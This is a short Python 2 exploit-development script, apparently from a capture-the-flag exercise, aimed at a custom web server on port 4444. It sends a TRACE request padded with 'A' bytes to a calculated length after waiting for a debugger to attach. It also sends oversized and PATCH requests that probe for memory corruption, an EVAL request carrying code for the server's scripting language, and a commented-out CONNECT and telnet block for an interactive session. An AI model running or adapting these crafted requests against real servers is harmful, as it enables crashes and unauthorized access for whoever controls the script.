import socket
import sys
import os

def sendtrace( s ):
	os.system("ps -aux | grep wdub")
	raw_input("AttachNow: ")
	a = "TRACE //index.html HTTP/1.1\r\n"
	a += "Content-Length: "

	sc = "\x41" * (0x20a - ( len(a) + 5 ) )

	a += str( len(sc) ) + '\r\n'
	
	a += "\r\n"
	a += sc

	print len(a)
	s.send(a)
	print s.recv(1024)
	return

def sendpatch( s ):
	a = "PATCH /index.html HTTP/1.1\r\n"
	a += "X-Offset: 14\r\n"

	b = "zeusz"*120 + "</body></html>"

	a += "Content-Length: " + str( len(b)+20 ) + '\r\n\r\n'
	a += b

	s.send(a)
	print s.recv(1024)
	return

def sendtoobig( s ):
	a = 'GET / HTTP/1.1\r\n'
	a += 'Content-Length: 2004\r\n\r\n'
	a += 'a'*2004

	s.send(a)
	print s.recv(1024)
	return

def sendget( s, page ):
	a = 'GET ' + page + ' HTTP/1.1\r\n\r\n'
	s.send(a)
	print s.recv(1024)
	return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect( (sys.argv[1], 4444) )
except:
	print '[-] Failed to connect to %s' %(sys.argv[1])
	sys.exit()

sendtrace( s )
s.close()
sys.exit()

a = "GET /index.ydg HTTP/1.1\r\n"
a += "Accept-Encoding: */*\r\n\r\n"

s.send(a)

print s.recv(1024)

a = "EVAL / HTTP/1.1\r\n"
a += "Content-Encoding: test\r\n"

evalz = "y = gimme 4;exite y 0 65;exite y 1 65;exite y 2 65; exite y 3 65;Yo y;"

a += "Content-Length: " + str(len(evalz)) + '\r\n\r\n'
a += evalz

s.send(a)
print s.recv(1024)

a = "POST /yodogtest.ydg HTTP/1.1\r\n\r\n"
s.send(a)
print s.recv(1024)

'''
a = "CONNECT localhost:9999 HTTP/1.1\r\n\r\n"
s.send(a)
import telnetlib
t = telnetlib.Telnet()
t.sock=s
t.interact()
'''
s.close()
